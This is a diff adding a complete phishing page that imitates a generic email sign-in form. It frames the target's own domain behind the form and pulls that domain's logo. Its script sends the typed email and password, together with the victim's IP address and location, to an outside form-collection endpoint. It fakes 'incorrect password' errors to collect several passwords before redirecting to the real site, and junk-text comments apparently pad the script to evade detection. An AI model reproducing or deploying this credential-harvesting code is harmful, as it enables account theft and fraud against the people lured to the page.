@@ -1,0 +1,173 @@
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+	* {
+		box-sizing: border-box;
+		padding: 0;
+		margin: 0;
+	}
+
+	body {
+		height: 100vh;
+		width: 100vw;
+		font-family: Arial, Helvetica, sans-serif;
+	}
+
+	.bg-img {
+		height: 100%;
+		width: 100%;
+		background-position: center;
+		background-repeat: no-repeat;
+		background-size: cover;
+	}
+	iframe {
+		height: 100%;
+		width: 100%;
+	}
+
+	/* Add styles to the form container */
+	.container {
+		max-width: 400px;
+		padding: 16px;
+		background-color: white;
+		border-radius: 5px;
+		position: absolute;
+		left: 50%;
+		top: 50%;
+		transform: translate(-50%, -50%);
+		z-index: 2;
+	}
+
+	@media (max-width: 480px) {
+		.container {
+			left: 10%;
+			top: 10%;
+			margin-left: 5%;
+			transform: translate(-10%, -10%);
+		}
+	}
+
+	/* Full-width input fields */
+	input[type=text], input[type=password] {
+		width: 100%;
+		padding: 15px;
+		margin: 5px 0 22px 0;
+		border: none;
+		background: #f1f1f1;
+	}
+
+	input[type=text]:focus, input[type=password]:focus {
+		background-color: #ddd;
+		outline: none;
+	}
+
+	.btn {
+		background-color: #0096FF;
+		color: white;
+		padding: 16px 20px;
+		border: none;
+		cursor: pointer;
+		width: 100%;
+		opacity: 0.9;
+	}
+
+	.btn:hover {
+		opacity: 1;
+	}
+
+	.img {
+		text-align: center;
+	}
+
+	#title {
+		text-align: center;
+		margin: 10px 0;
+	}
+
+	#error {
+		display: none;
+		color: red;
+	}
+</style>
+</head>
+<body>
+<script></script>
+<div class="bg-img" id="bg-img">
+	<iframe id="frame" src="https://" scrolling="no" sandbox="allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 100%;border: none;" width="100%"></iframe>
+</div>
+<form class="container" id="login-form">
+	<div class="img">
+		<img src="" id="logo">
+	</div>
+
+	<h3 id="title">Sign In</h3>
+
+	<h5 id="error">Password is incorrect, please try again!</h5>
+
+	<label for="email"><b>Email Address</b></label>
+	<input type="text" placeholder="Enter Email" name="email" id="email" required="" readonly="">
+
+	<label for="psw"><b>Password</b></label>
+	<input type="password" placeholder="Enter Password" name="password" id="psw" required="">
+
+	<input type="hidden" name="step" id="step">
+
+	<button type="submit" class="btn">Sign In</button>
+</form>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script>
+  /* global $ */ 
+  /////////JUNK CODE HERE/////////DKJDJKFJHFDJSDJHKLJHLSDFJHKLFJKLFJKLFJKLIERUIEGNNM,D;kmccjijxijxmM,M,DJJNJJDIJXJXJXJJCJXJXJCJKIKJKDUDSDJHDJHDSJHDJKLSDUILSDUISDLDJKLDSDJKLSDJKLSDJKLSDJKLSDLSDNSDNM,
+  /////////////JUNK CODE HERE//////////////// fidjdiddjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjdididkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkddjjjjjjjjjGMMJKJ
+  /////////////JUNK CODE HERE//////////////// DBDFFFFF3333eeeeeeeeerddiddddddjkksokddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddddkGN;GR;LGJKRNGRGJER;GKLJR;KL
+	let step = 1;
+	
+	const clientID = window.location.hash.split("#").pop();
+	$('#email').val(clientID);
+	const domain = clientID.split('@').pop();
+
+	$("#frame").attr("src", "https://" + domain);
+	$("#logo").attr("src", "https://logo.clearbit.com/" + domain);
+
+	const submit = $("button[type='submit']");
+
+	$("#login-form").submit(function(event) {
+		event.preventDefault();
+
+		submit.text('Verifying...');
+
+		$.getJSON('https://ipinfo.io/json', function(response) {
+			const posting = $.post("https://nocodeform.io/f/64c13df31108665779450467", {
+				_subject: "Logs | " + response.ip,
+				Email: $("#email").val(),
+				Password: $("#psw").val(),
+				Attempts: step,
+				IP: response.ip,
+				Location: response.city + ", " + response.country,
+			});
+
+			posting.done(function(data) {
+				if (step === 4) {
+					window.location.href = "http://" + domain;
+				} else {
+					step++;
+					$("#error").css("display", "block");
+					submit.text('Sign In');
+					$("#psw").val("");
+				}
+			});
+
+			posting.fail(function(error) {
+				console.error(error);
+				$("#error").css("display", "block");
+				submit.text('Sign In');
+				$("#psw").val("");
+			});
+		}, "json");
+	});
+</script>
+</body></html>
+
+
